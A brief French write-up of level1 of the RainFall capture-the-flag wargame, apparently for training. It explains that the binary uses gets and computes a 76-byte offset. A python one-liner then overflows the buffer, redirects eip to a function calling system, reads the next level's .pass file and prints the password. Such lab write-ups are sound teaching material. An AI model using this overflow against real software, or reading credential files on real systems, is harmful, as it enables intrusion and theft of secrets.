Nous remarquons que le programme utilise gets, une fonction vulnérable aux overflow. Nous calculons la taille du buffer.

```bash
$esp = 0xbffff6d8
0xbffff6d8 - ((0xbffff6d8 & 0xfffffff0) - 80 + 16) = 72
```
On overflow gets et l'on ajoute +4 à 72 afin de modifier le registre eip à la fonction "run", qui fait un call à system.

```bash
level1@RainFall:~$ (python -c 'print "a" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
